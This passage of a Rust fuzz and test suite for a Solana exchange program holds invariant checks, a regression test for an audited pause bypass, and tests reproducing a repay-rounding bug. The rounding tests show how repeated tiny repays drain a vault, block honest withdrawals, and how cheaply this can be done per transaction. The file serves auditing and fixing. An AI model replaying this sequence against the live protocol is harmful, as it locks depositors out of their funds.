        let now_ts = pm.last_funding_rate_ts;
        if let Some((prev_long, prev_short, prev_ts)) = fixture.prev_funding {
            // Guard 1: needs a prior sample (initial-state FP) — implied here.
            // Guard 2: the clock actually advanced by a full funding period, so
            // this was a real funding application and not a no-op call.
            let period = pm.market_stats.funding_period.max(1);
            let advanced = now_ts.saturating_sub(prev_ts) >= period;
            // Guard 3: funding is only owed when there IS open interest. A flat
            // market legitimately applies zero funding.
            let has_oi = pm.amm.base_asset_amount_with_amm != 0
                || pm.base_asset_amount_long != 0
                || pm.base_asset_amount_short != 0;
            let both_unchanged = now_long == prev_long && now_short == prev_short;
            // FP GUARD (learned from a real firing on the remote campaign,
            // crash_01f353f26e91784b): funding is proportional to the MARK-vs-ORACLE
            // premium, not to open interest. `cumulative_funding_rate_*` is advanced
            // by `+= funding_rate_*_value` (controller/funding.rs:399-404), so a
            // period in which the computed rate is ZERO leaves both cumulative rates
            // untouched while `last_funding_rate_ts` still moves (funding.rs:454).
            // An AMM quoting exactly at the oracle has a zero premium and therefore
            // zero funding at ANY open interest — the fixture's default state, which
            // is why this fired with the genesis values long=0 short=0.
            //
            // So only assert when a NONZERO rate was actually computed for the
            // period: that is the case where "the rate existed but was not applied"
            // is a real defect rather than correct arithmetic.
            let rate_was_nonzero = pm.last_funding_rate != 0;
            fuzz_assert!(
                !(advanced && has_oi && both_unchanged && rate_was_nonzero),
                "family X: funding clock advanced {}s (>= period {}) with open interest \
                 (long={} short={} amm={}) but both cumulative rates are unchanged \
                 (long={} short={}) — the period's funding was discarded",
                now_ts.saturating_sub(prev_ts),
                period,
                pm.base_asset_amount_long,
                pm.base_asset_amount_short,
                pm.amm.base_asset_amount_with_amm,
                now_long,
                now_short
            );
        }
        fixture.prev_funding = Some((now_long, now_short, now_ts));
    }
}

// ===========================================================================
// Phase 3 — regression harnesses (PENDING audit-fix PRs). Off by default; each
// has its own `[features]` entry. Each asserts the FIXED behavior, so it FAILS
// on current (pre-fix) master — proving the fuzzer catches the bug — and flips
// to passing once the PR merges.
//
// IMPLEMENTED:
//   * #270 (F1) — below. Reproduces on master: the market-scoped SettlePnl
//     pause is not enforced on `settle_expired_position`, so a paused market's
//     expired position still settles (master runs deep into settlement logic —
//     error 6135 InvalidSpotMarketState — instead of rejecting early with 6158
//     InvalidMarketStatusToSettlePnl as the fix does).
//
// DEFERRED (documented, not stubbed — each needs state this injection-based
// tier cannot cheaply build; better homed in P8 or a dedicated escrow harness):
//   * #256 builder fee — needs a RevenueShareEscrow with an approved-builder row
//     written by `add_builder_order`, a place with expired `max_ts` that
//     soft-skips, then a fill that reuses the id. Requires the full builder-code
//     escrow + fill/matching engine.
//   * #273 revenue-share sub_account — needs `builder_codes_enabled`, a
//     RevenueShareEscrow with accrued fees, and a sibling recipient User at
//     sub_account_id != 0 driven through `load_revenue_share_map`.
//   * #271 signed-msg pause / replay resize — the signing infrastructure now
//     exists (`action_place_signed_msg_taker_order`), so what remains is the
//     authority/delegate resize path and the pause bit; no longer blocked on
//     envelope construction.
//   * #272 deposit/withdraw/revenue pause on bypassed paths — the bugs live on
//     `transfer_pools`, `liquidate_spot_with_swap_begin`, and the opportunistic
//     revenue-to-IF settle, none of which the direct deposit/withdraw actions
//     here reach.
//   * #276 funding pause — spot interest only diverges under nonzero
//     borrow/utilization (needs a borrowing counterparty); the bid/ask-TWAP and
//     funding-settlement side-effect cases need the funding crank + fills.
// ===========================================================================

// PENDING PR #270 (OtterSec F1): perp-pause enforcement. `settle_expired_position`
// (the Settlement-market path of `settle_pnl`) never checked the market-scoped
// `PerpOperation::SettlePnl` pause bit, so a paused market's expired positions
// could still be settled permissionlessly. The fix makes it revert
// `InvalidMarketStatusToSettlePnl` (6158). Here we inject a Settlement-status
// perp market with the SettlePnl bit set and a user holding a pure-PnL expired
// position (base==0, quote>0, so the margin calc is skipped), then call
// `settle_pnl`. FIXED => error 6158; MASTER => the settle proceeds (no 6158).
#[cfg(feature = "regr_270_perp_pause")]
mod regr_270 {
    use super::*;

    pub const E_INVALID_MARKET_STATUS_TO_SETTLE_PNL: u32 = 6158;

    #[derive(Clone)]
    pub struct Regr270 {
        pub ctx: TestContext,
        pub program_id: Pubkey,
        pub state_pda: Pubkey,
        pub spot_market_pda: Pubkey,
        pub spot_vault_pda: Pubkey,
        pub perp_market_pda: Pubkey,
        pub user_pda: Pubkey,
        pub user_kp: Rc<Keypair>,
    }

    #[fuzz_fixture]
    impl Regr270 {
        pub fn setup() -> Self {
            let mut ctx = TestContext::new();
            let program_id = velocity_program_id();
            ctx.add_program(&program_id, VELOCITY_SO).unwrap();

            let (signer_pda, signer_nonce) =
                Pubkey::find_program_address(&[b"velocity_signer"], &program_id);
            let (state_pda, _) = Pubkey::find_program_address(&[b"velocity_state"], &program_id);

            // State: exchange fully Active (so `settle_pnl_not_paused` and
            // `amm_not_paused` pass); NO feature_bit_flags (builder codes off).
            let mut state = State::default();
            state.signer = anchor_pk(signer_pda);
            state.signer_nonce = signer_nonce;
            state.exchange_status = 0;
            state.number_of_spot_markets = 1;
            state.number_of_markets = 1;
            inject(&mut ctx, state_pda, &mut state);

            // USDC mint + quote spot market + vault.
            let usdc_mint = Keypair::new().pubkey();
            ctx.create_mint()
                .pubkey(usdc_mint)
                .mint_authority(signer_pda)
                .decimals(6)
                .create()
                .unwrap();

            let mi0 = 0u16.to_le_bytes();
            let (spot_market_pda, _) =
                Pubkey::find_program_address(&[b"spot_market", &mi0], &program_id);
            let (spot_vault_pda, _) =
                Pubkey::find_program_address(&[b"spot_market_vault", &mi0], &program_id);
            let (if_vault_pda, _) =
                Pubkey::find_program_address(&[b"insurance_fund_vault", &mi0], &program_id);
            let mut spot_market =
                build_spot_market_usdc(spot_market_pda, usdc_mint, spot_vault_pda, if_vault_pda);
            inject(&mut ctx, spot_market_pda, &mut spot_market);
            ctx.create_token_account()
                .pubkey(spot_vault_pda)
                .mint(usdc_mint)
                .token_owner(signer_pda)
                .amount(1_000_000_000)
                .create()
                .unwrap();

            // Perp market: Settlement status, SettlePnl operation paused, expiry set.
            let (perp_market_pda, _) =
                Pubkey::find_program_address(&[b"perp_market", &mi0], &program_id);
            // This regression settles a pure-PnL expired position (base == 0), so
            // the margin/oracle path is skipped entirely. Keep the original
            // hard-coded $1 QuoteAsset oracle rather than the invariant harness's
            // injected PythLazer feed: no oracle account is then needed in
            // remaining_accounts, which keeps the reproduction minimal and
            // independent of the oracle fixture.
            let mut perp_market =
                build_perp_market(perp_market_pda, 0, Pubkey::new_from_array([0u8; 32]));
            perp_market.oracle_source = OracleSource::QuoteAsset;
            perp_market.status = MarketStatus::Settlement;
            perp_market.expiry_ts = -100; // deep past, so the settlement buffer is reached
            perp_market.expiry_price = 1_000_000; // $1
            perp_market.paused_operations = 0b0000_1000; // PerpOperation::SettlePnl
            perp_market.pnl_pool.scaled_balance = 100 * SPOT_BALANCE_PRECISION; // backing for the claim
            inject(&mut ctx, perp_market_pda, &mut perp_market);

            // User with a pure-PnL expired position (base==0, quote>0).
            let user_kp = Rc::new(Keypair::new());
            ctx.create_account()
                .pubkey(user_kp.pubkey())
                .lamports(10_000_000_000)
                .owner(system_program_id())
                .create()
                .unwrap();
            let (user_pda, _) = Pubkey::find_program_address(
                &[b"user", user_kp.pubkey().as_ref(), &mi0],
                &program_id,
            );
            let mut user = User::default();
            user.authority = anchor_pk(user_kp.pubkey());
            user.sub_account_id = 0;
            user.pool_id = 0;
            user.perp_positions[0].market_index = 0;
            user.perp_positions[0].base_asset_amount = 0;
            user.perp_positions[0].quote_asset_amount = 1_000_000; // +$1 claim
            inject(&mut ctx, user_pda, &mut user);

            Regr270 {
                ctx,
                program_id,
                state_pda,
                spot_market_pda,
                spot_vault_pda,
                perp_market_pda,
                user_pda,
                user_kp,
            }
        }

        pub fn action_noop(&mut self) {
            let _ = &self.ctx;
        }
    }
}

#[cfg(feature = "regr_270_perp_pause")]
use regr_270::Regr270;

#[cfg(feature = "regr_270_perp_pause")]
#[crucible_fuzz]
fn regr_270_perp_pause(fixture: &mut Regr270, #[range(0..1u8)] _unused: u8) {
    let args = 0u16.to_le_bytes(); // market_index
    let outcome = fixture
        .ctx
        .raw_call(Instruction {
            program_id: fixture.program_id,
            accounts: vec![
                AccountMeta::new_readonly(fixture.state_pda, false),
                AccountMeta::new(fixture.user_pda, false),
                AccountMeta::new_readonly(fixture.user_kp.pubkey(), true),
                AccountMeta::new_readonly(fixture.spot_vault_pda, false),
                // remaining: quote spot market (w) + perp market (w)
                AccountMeta::new(fixture.spot_market_pda, false),
                AccountMeta::new(fixture.perp_market_pda, false),
            ],
            data: ix_data(D_SETTLE_PNL, &args),
        })
        .signers(&[&fixture.user_kp])
        .send();

    let code = outcome.ok().and_then(|o| o.error_code());
    // FIXED behavior: settling an expired position in a SettlePnl-paused market
    // must be rejected with InvalidMarketStatusToSettlePnl (6158). On pre-fix
    // master the pause is not checked on this path, so `code` will be None
    // (success) or some other error — this assertion then fails, reproducing
    // the bug.
    fuzz_assert_eq!(
        code,
        Some(regr_270::E_INVALID_MARKET_STATUS_TO_SETTLE_PNL),
        "PR #270: expired-position settle in a SettlePnl-paused market was not blocked (got error_code={:?})",
        code
    );
}

// ---------------------------------------------------------------------------
// Investigation: repay rounding on a spot borrow (issue-01)
//
// Every test here drives REAL deposit/withdraw instructions through the real
// compiled velocity.so under LiteSVM and then reads the resulting on-chain
// SpotMarket + SPL vault back out. Nothing is mocked and no account bytes are
// hand-written after setup.
// ---------------------------------------------------------------------------
#[cfg(test)]
mod repay_rounding {
    use super::*;

    /// (vault_amount, depositors_claim) for a spot market, straight from the
    /// program's own `validate_spot_balances`.
    pub(crate) fn vault_and_claim(f: &Fixture, market_index: u16) -> (u64, i64) {
        let (sm, vault_pda) = if market_index == 1 {
            (f.read_spot_market_1().unwrap(), f.spot_vault_1_pda)
        } else {
            (f.read_spot_market().unwrap(), f.spot_vault_pda)
        };
        let vault = f.ctx.token_balance(&vault_pda);
        let claim = velocity::math::spot_withdraw::validate_spot_balances(&sm).unwrap();
        (vault, claim)
    }

    /// claim - vault. Positive == the market owes more than it holds.
    pub(crate) fn deficit(f: &Fixture, market_index: u16) -> i128 {
        let (vault, claim) = vault_and_claim(f, market_index);
        claim as i128 - vault as i128
    }

    pub(crate) fn solvent(f: &Fixture, market_index: u16) -> bool {
        let (sm, vault_pda) = if market_index == 1 {
            (f.read_spot_market_1().unwrap(), f.spot_vault_1_pda)
        } else {
            (f.read_spot_market().unwrap(), f.spot_vault_pda)
        };
        let vault = f.ctx.token_balance(&vault_pda);
        velocity::math::spot_withdraw::validate_spot_market_vault_amount(&sm, vault).is_ok()
    }

    /// The user's signed token position in `market_index` (borrow == negative),
    /// computed with the program's own conversion.
    pub(crate) fn user_token(f: &Fixture, user_idx: usize, market_index: u16) -> i128 {
        let sm = if market_index == 1 {
            f.read_spot_market_1().unwrap()
        } else {
            f.read_spot_market().unwrap()
        };
        let user = f.read_user(&f.users[user_idx].user_pda).unwrap();
        for sp in user.spot_positions.iter() {
            if sp.market_index != market_index || sp.scaled_balance == 0 {
                continue;
            }
            let tok = velocity::math::spot_balance::get_token_amount(
                sp.scaled_balance as u128,
                &sm,
                &sp.balance_type,
            )
            .unwrap() as i128;
            return match sp.balance_type {
                SpotBalanceType::Deposit => tok,
                SpotBalanceType::Borrow => -tok,
            };
        }
        0
    }

    pub(crate) fn cum_borrow(f: &Fixture, market_index: u16) -> u128 {
        if market_index == 1 {
            f.read_spot_market_1().unwrap().cumulative_borrow_interest
        } else {
            f.read_spot_market().unwrap().cumulative_borrow_interest
        }
    }

    /// Exactly the 5 minimized fuzz actions. Confirms the violation and pins the
    /// gap at 1 unit, and shows step 4 (the FIRST repay) is still solvent.
    #[test]
    fn t1_minimized_sequence_reproduces() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 373_858_895_794, 0, 1));
        assert!(f.action_deposit(1, 587_699_589_920, 1, 0));
        println!("after supply:      deficit={}", deficit(&f, 1));

        assert!(f.action_withdraw(0, 502_235_509_256, 1, 0));
        println!(
            "after borrow:      deficit={} user0_tok={} cum_borrow={}",
            deficit(&f, 1),
            user_token(&f, 0, 1),
            cum_borrow(&f, 1)
        );
        assert_eq!(
            deficit(&f, 1),
            -1,
            "the withdraw must leave 1 unit of slack IN THE PROTOCOL'S FAVOR"
        );

        assert!(f.action_deposit(0, 733_949_386, 1, 1));
        println!("after repay #1:    deficit={}", deficit(&f, 1));
        assert_eq!(deficit(&f, 1), 0, "first repay consumes the slack");
        assert!(solvent(&f, 1));

        assert!(f.action_deposit(0, 2, 1, 1));
        println!("after repay #2:    deficit={}", deficit(&f, 1));
        assert_eq!(deficit(&f, 1), 1, "second repay goes 1 unit negative");
        assert!(!solvent(&f, 1), "market 1 must now be insolvent");
    }

    /// THE KEY QUESTION: does repeating the repay grow the gap?
    #[test]
    fn t2_amplification_one_unit_per_repay() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));

        let d0 = deficit(&f, 1);
        let debt0 = user_token(&f, 0, 1);
        println!("borrowed: deficit={d0} debt={debt0}");

        let n = 200usize;
        let mut prev = d0;
        for i in 0..n {
            assert!(f.action_deposit(0, 1, 1, 1), "repay {i} must succeed");
            let d = deficit(&f, 1);
            if i < 5 || i == n - 1 {
                println!(
                    "repay {:>3}: deficit={} debt={} cum_borrow={}",
                    i,
                    d,
                    user_token(&f, 0, 1),
                    cum_borrow(&f, 1)
                );
            }
            assert!(d >= prev, "deficit must not shrink at repay {i}");
            prev = d;
        }
        let dn = deficit(&f, 1);
        println!("after {n} 1-unit repays: deficit={dn} (started {d0})");
        assert!(
            dn >= d0 + (n as i128) - 2,
            "expected ~1 unit of deficit per repay, got {} over {} repays",
            dn - d0,
            n
        );
        assert!(!solvent(&f, 1));
    }

    /// Does the 1-unit-per-repay also mean the debt is over-forgiven, i.e. can
    /// the borrower clear the loan for less than they borrowed?
    #[test]
    fn t3_debt_forgiveness_per_repay() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));

        let borrow: u64 = 60; // 60 smallest units (9 decimals) — keep the tx count small
        assert!(f.action_withdraw(0, borrow, 1, 0));
        let debt_after_borrow = -user_token(&f, 0, 1);
        println!("borrowed {borrow}, debt recorded {debt_after_borrow}");

        // Repay 1 unit at a time until the debt is gone; count what was paid.
        let mut paid: u64 = 0;
        let mut steps = 0usize;
        while user_token(&f, 0, 1) < 0 && steps < 200 {
            if !f.action_deposit(0, 1, 1, 1) {
                break;
            }
            paid += 1;
            steps += 1;
        }
        println!(
            "cleared debt of {} by paying {} ({} steps). residual position={} deficit={}",
            debt_after_borrow,
            paid,
            steps,
            user_token(&f, 0, 1),
            deficit(&f, 1)
        );
        assert!(user_token(&f, 0, 1) >= 0, "debt should be cleared");
    }

    /// Once the market is short, which real user-facing instructions stop
    /// working — and does it hit the honest depositor (user1), not just the
    /// attacker (user0)?
    #[test]
    fn t4_what_breaks_for_the_honest_depositor() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));
        for _ in 0..3 {
            assert!(f.action_deposit(0, 1, 1, 1));
        }
        let d = deficit(&f, 1);
        println!("deficit before probing withdrawals: {d}");
        assert!(d > 0 && !solvent(&f, 1));

        let (vault, claim) = vault_and_claim(&f, 1);
        println!("vault={vault} claim={claim}");

        // Honest depositor pulls out a normal-sized amount.
        let small = f.action_withdraw(1, 1 * BASE_PRECISION_U64, 1, 0);
        println!("user1 withdraw 1.0 unit  -> {small}");
        // Honest depositor tries to pull out everything they are owed.
        let full = f.action_withdraw(1, 500 * BASE_PRECISION_U64, 1, 0);
        println!("user1 withdraw 500 units -> {full}");
        // Attacker borrows more.
        let more = f.action_withdraw(0, 1 * BASE_PRECISION_U64, 1, 0);
        println!("user0 borrow 1.0 unit    -> {more}");
        // Anyone deposits.
        let dep = f.action_deposit(1, 1 * BASE_PRECISION_U64, 1, 0);
        println!("user1 deposit 1.0 unit   -> {dep}");
        println!("deficit after probes: {}", deficit(&f, 1));
    }

    /// Does the same repay pattern break a 6-decimal market (market 0, USDC)?
    /// Market 1 is used as the collateral this time.
    #[test]
    fn t5_six_decimal_market() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0)); // user0 supplies USDC
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0)); // user1 collateral

        let d_start = deficit(&f, 0);
        println!("market0 start deficit={d_start}");
        assert!(f.action_withdraw(1, 100 * QUOTE_PRECISION as u64, 0, 0)); // user1 borrows USDC
        println!(
            "market0 after borrow deficit={} debt={}",
            deficit(&f, 0),
            user_token(&f, 1, 0)
        );

        let mut prev = deficit(&f, 0);
        for i in 0..50 {
            assert!(f.action_deposit(1, 1, 0, 1), "repay {i}");
            let d = deficit(&f, 0);
            if i < 5 {
                println!(
                    "market0 repay {i}: deficit={} debt={}",
                    d,
                    user_token(&f, 1, 0)
                );
            }
            prev = d;
        }
        println!(
            "market0 after 50 1-unit repays: deficit={} (start {}), solvent={}",
            prev,
            d_start,
            solvent(&f, 0)
        );
    }
}

#[cfg(test)]
mod repay_rounding_2 {
    use super::{repay_rounding::*, *};

    /// Same as `Fixture::action_withdraw`, but returns the anchor error code so
    /// we can prove WHICH check rejects the withdrawal.
    fn withdraw_code(
        f: &mut Fixture,
        user_idx: usize,
        amount: u64,
        market_index: u16,
    ) -> Option<u32> {
        let user = f.users[user_idx].clone();
        let (_sm, vault, _ifv, token_account) = f.spot_of(market_index, &user);
        let mut args = Vec::new();
        args.extend_from_slice(&market_index.to_le_bytes());
        args.extend_from_slice(&amount.to_le_bytes());
        args.push(0u8);
        let mut accounts = vec![
            AccountMeta::new_readonly(f.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(f.signer_pda, false),
            AccountMeta::new(token_account, false),
            AccountMeta::new_readonly(token_program_id(), false),
        ];
        accounts.extend(f.market_ras(true));
        let outcome = f
            .ctx
            .raw_call(Instruction {
                program_id: f.program_id,
                accounts,
                data: ix_data(D_WITHDRAW, &args),
            })
            .signers(&[&user.keypair])
            .send();
        outcome.ok().and_then(|o| o.error_code())
    }

    /// Which error rejects the honest depositor once the market is short?
    #[test]
    fn t6_withdraw_rejection_is_the_solvency_guard() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));

        // Healthy baseline: user1 can withdraw before the attack.
        assert_eq!(
            withdraw_code(&mut f, 1, 1 * BASE_PRECISION_U64, 1),
            None,
            "baseline withdraw must succeed"
        );

        assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));
        // Repay 1 unit at a time until the market is 2 units short. A successful
        // withdrawal heals exactly 1 unit (the withdraw debit also rounds up), so
        // 1 unit of deficit is self-healing and 2 is the point of no return.
        let mut repays = 0;
        while deficit(&f, 1) < 2 {
            assert!(f.action_deposit(0, 1, 1, 1));
            repays += 1;
            assert!(repays < 20);
        }
        println!("deficit={} after {} 1-unit repays", deficit(&f, 1), repays);

        let c_small = withdraw_code(&mut f, 1, 1 * BASE_PRECISION_U64, 1);
        let c_full = withdraw_code(&mut f, 1, 400 * BASE_PRECISION_U64, 1);
        let c_dust = withdraw_code(&mut f, 1, 1, 1);
        let c_borrow = withdraw_code(&mut f, 0, 1 * BASE_PRECISION_U64, 1);
        println!("user1 withdraw 1.0   -> {:?}", c_small);
        println!("user1 withdraw 400.0 -> {:?}", c_full);
        println!("user1 withdraw 1 unit-> {:?}", c_dust);
        println!("user0 borrow 1.0     -> {:?}", c_borrow);
        // 6173 == SpotMarketVaultInvariantViolated.
        assert_eq!(c_small, Some(6173));
        assert_eq!(c_dust, Some(6173));
        assert_eq!(c_borrow, Some(6173));
        // 6092 == SpotMarketInsufficientDeposits: the 400-unit request trips the
        // pre-existing liquidity limit first, so it is not evidence either way.
        assert_eq!(c_full, Some(6092));
        // Deposits still work, and do NOT heal the shortfall.
        let d_before = deficit(&f, 1);
        assert!(f.action_deposit(1, 10 * BASE_PRECISION_U64, 1, 0));
        println!("deposit does not heal: {} -> {}", d_before, deficit(&f, 1));
        assert_eq!(deficit(&f, 1), d_before);

        // A plain SPL transfer straight into the vault DOES heal it: the vault
        // grows without any ledger credit. This is the cheap mitigation.
        let vault = f.ctx.token_balance(&f.spot_vault_1_pda);
        f.ctx
            .create_token_account()
            .pubkey(f.spot_vault_1_pda)
            .mint(f.sol_mint)
            .token_owner(f.signer_pda)
            .amount(vault + 100)
            .create()
            .unwrap();
        println!("after donating 100 units: deficit={}", deficit(&f, 1));
        assert_eq!(
            withdraw_code(&mut f, 1, 1 * BASE_PRECISION_U64, 1),
            None,
            "donation restores withdrawals"
        );
    }

    /// The rounding path never reads asset/liability weights. Re-run with a
    /// market-1 configured with weights == 1.0 (everything else unchanged) to
    /// show the synthetic weights are not what produces the bug.
    #[test]
    fn t7_weights_are_irrelevant() {
        let mut f = Fixture::setup();
        // Genesis re-configuration only: market 1 has zero balances and an empty
        // vault at this point, so nothing is being fabricated.
        let mut sm = f.read_spot_market_1().unwrap();
        sm.initial_asset_weight = SPOT_WEIGHT_PRECISION as u32;
        sm.maintenance_asset_weight = SPOT_WEIGHT_PRECISION as u32;
        sm.initial_liability_weight = SPOT_WEIGHT_PRECISION as u32;
        sm.maintenance_liability_weight = SPOT_WEIGHT_PRECISION as u32;
        assert_eq!(sm.deposit_balance, 0);
        assert_eq!(sm.borrow_balance, 0);
        inject(&mut f.ctx, f.spot_market_1_pda, &mut sm);

        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));
        let d0 = deficit(&f, 1);
        for _ in 0..10 {
            assert!(f.action_deposit(0, 1, 1, 1));
        }
        let d1 = deficit(&f, 1);
        println!("weights=1.0: deficit {d0} -> {d1}");
        assert_eq!(d1 - d0, 10, "still 1 unit per repay with neutral weights");
    }

    /// `update_spot_market_cumulative_interest` for market 1 (the harness action
    /// is hard-wired to market 0).
    fn crank_interest_1(f: &mut Fixture) -> bool {
        let crank = f.crank.clone();
        f.ctx
            .raw_call(Instruction {
                program_id: f.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(f.state_pda(), false),
                    AccountMeta::new(f.spot_market_1_pda, false),
                    AccountMeta::new_readonly(f.spot_1_oracle_pda, false),
                    AccountMeta::new_readonly(f.spot_vault_1_pda, false),
                ],
                data: ix_data(D_UPDATE_SPOT_MARKET_CUMULATIVE_INTEREST, &[]),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Does accrued borrow interest fix it, or make it worse?
    #[test]
    fn t8_with_accrued_interest() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 400 * BASE_PRECISION_U64, 1, 0)); // 80% utilization

        for _ in 0..12 {
            assert!(f.action_warp(2_600_000, 1));
            assert!(crank_interest_1(&mut f), "interest crank must succeed");
        }
        let c = cum_borrow(&f, 1);
        println!("cumulative_borrow_interest = {c} (started 10000000000)");
        assert!(c > 10_000_000_000, "interest must have accrued");

        let d0 = deficit(&f, 1);
        let debt0 = user_token(&f, 0, 1);
        for i in 0..10 {
            if !f.action_deposit(0, 1, 1, 1) {
                println!("repay {i} failed");
                break;
            }
        }
        let d1 = deficit(&f, 1);
        println!(
            "with interest: deficit {d0} -> {d1} (delta {}), debt {debt0} -> {}",
            d1 - d0,
            user_token(&f, 0, 1)
        );
        assert!(d1 > d0, "accrued interest does not fix the leak");
    }

    /// A 6-decimal market leaks at 1/1000th the rate: one scaled unit is worth
    /// 1e10/1e13 = 0.001 tokens, so ~1000 repays are needed to move the vault by
    /// one token unit. `t5` (50 repays) was too short to see it.
    #[test]
    fn t10_six_decimals_leaks_slowly() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(1, 100 * QUOTE_PRECISION as u64, 0, 0));
        let d0 = deficit(&f, 0);
        for i in 0..1500 {
            assert!(f.action_deposit(1, 1, 0, 1), "repay {i}");
        }
        let d1 = deficit(&f, 0);
        println!(
            "6 decimals: deficit {d0} -> {d1} after 1500 repays (delta {})",
            d1 - d0
        );
        assert!(d1 > d0, "6-decimal market leaks as well");
    }

    /// `reduce_only` is not required: a plain deposit into a borrow position
    /// takes the same path and leaks the same way.
    #[test]
    fn t11_plain_repay_leaks_too() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));
        let d0 = deficit(&f, 1);
        for _ in 0..10 {
            assert!(f.action_deposit(0, 1, 1, 0), "reduce_only = 0");
        }
        let d1 = deficit(&f, 1);
        println!("reduce_only=0: deficit {d0} -> {d1}");
        assert_eq!(d1 - d0, 10);
    }

    /// How much deficit can one TRANSACTION create? Pack N repay instructions
    /// into a single tx until it stops fitting. This is the real cost figure:
    /// one signature fee (5,000 lamports) buys N units of deficit.
    #[test]
    fn t12_repays_per_transaction() {
        for n in [10usize, 20, 30, 40, 50] {
            let mut f = Fixture::setup();
            assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
            assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
            assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));
            let d0 = deficit(&f, 1);

            let user = f.users[0].clone();
            let (spot_market, vault, _ifv, token_account) = f.spot_of(1, &user);
            let mut ok = true;
            for _ in 0..n {
                let mut args = Vec::new();
                args.extend_from_slice(&1u16.to_le_bytes());
                args.extend_from_slice(&1u64.to_le_bytes());
                args.push(1u8);
                let ix = Instruction {
                    program_id: f.program_id,
                    accounts: vec![
                        AccountMeta::new_readonly(f.state_pda(), false),
                        AccountMeta::new(user.user_pda, false),
                        AccountMeta::new(user.stats_pda, false),
                        AccountMeta::new_readonly(user.keypair.pubkey(), true),
                        AccountMeta::new(vault, false),
                        AccountMeta::new(token_account, false),
                        AccountMeta::new_readonly(token_program_id(), false),
                        AccountMeta::new(f.spot_1_oracle_pda, false),
                        AccountMeta::new(spot_market, false),
                    ],
                    data: ix_data(D_DEPOSIT, &args),
                };
                if f.ctx
                    .raw_call(ix)
                    .signers(&[&user.keypair])
                    .add_transaction()
                    .is_err()
                {
                    ok = false;
                    break;
                }
            }
            let sent = ok
                && f.ctx
                    .send_batch()
                    .map(|o| o.map(|o| o.is_success()).unwrap_or(false))
                    .unwrap_or(false);
            println!(
                "{n} repays in one tx -> sent={sent} deficit {d0} -> {}",
                deficit(&f, 1)
            );
        }
    }

    /// Which OTHER real instructions stop working once the market is short?
    /// `update_spot_market_cumulative_interest` (the keeper crank that accrues
    /// interest for the whole market) also calls the guard.
    #[test]
    fn t13_interest_crank_blocked() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 400 * BASE_PRECISION_U64, 1, 0));

        // Attack first, while cumulative interest is still at its initial value.
        let mut repays = 0;
        while deficit(&f, 1) < 2 {
            assert!(f.action_deposit(0, 1, 1, 1));
            repays += 1;
            assert!(repays < 20);
        }
        println!("deficit={} after {} repays", deficit(&f, 1), repays);

        let blocked = crank_interest_1(&mut f);
        println!("update_spot_market_cumulative_interest (short) -> {blocked}");
        assert!(!blocked, "the interest crank must be blocked");

        // HOW LONG DOES IT LAST? Accrued borrow interest grows the vault surplus,
        // so the shortfall is absorbed on its own once enough time passes.
        // Report the point at which the crank starts working again.
        {
            let mut g = f.clone();
            let mut slots = 0u64;
            for _ in 0..40 {
                assert!(g.action_warp(500, 1));
                slots += 500;
                if crank_interest_1(&mut g) {
                    break;
                }
            }
            println!(
                "deficit 2 self-heals after ~{} slots (~{} s) of interest accrual; deficit now {}",
                slots,
                slots * 400 / 1000,
                deficit(&g, 1)
            );
        }

        // Heal with a direct SPL transfer into the vault, then the same crank works.
        let vault = f.ctx.token_balance(&f.spot_vault_1_pda);
        f.ctx
            .create_token_account()
            .pubkey(f.spot_vault_1_pda)
            .mint(f.sol_mint)
            .token_owner(f.signer_pda)
            .amount(vault + 100)
            .create()
            .unwrap();
        let healed = crank_interest_1(&mut f);
        println!("same crank after a 100-unit donation -> {healed}");
        assert!(healed, "donation restores the crank");
    }

    /// DURABILITY. Interest accrual is what absorbs the shortfall, and interest
